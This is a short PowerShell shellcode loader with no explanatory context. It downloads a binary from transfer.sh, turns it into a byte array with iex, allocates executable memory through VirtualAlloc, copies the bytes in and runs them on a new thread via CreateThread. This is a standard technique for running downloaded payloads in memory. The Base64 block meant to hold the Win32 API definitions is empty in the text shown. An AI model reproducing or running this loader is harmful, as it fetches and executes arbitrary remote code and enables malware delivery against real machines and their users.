$target = "https://transfer.sh/test.bin"
$file = (iwr $target).content
$ps_code = '[Byte[]] $nice = '
foreach ($byte in $file) {
    $ps_code += '0x{0:X2}, ' -f $byte
}
iex $ps_code.TrimEnd(', ')
$WinAPI = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('')))
Add-Type $WinAPI;  
$size = $nice.Length;
[IntPtr]$addr = [Win32]::VirtualAlloc(0, $size, 0x3000, 0x40);	
[System.Runtime.InteropServices.Marshal]::Copy($nice, 0, $addr, $size);
$handling = [Win32]::CreateThread(0, 0, $addr, 0, 0, 0);
[Win32]::WaitForSingleObject($handling, [uint32]"0xFFFFFFFF");
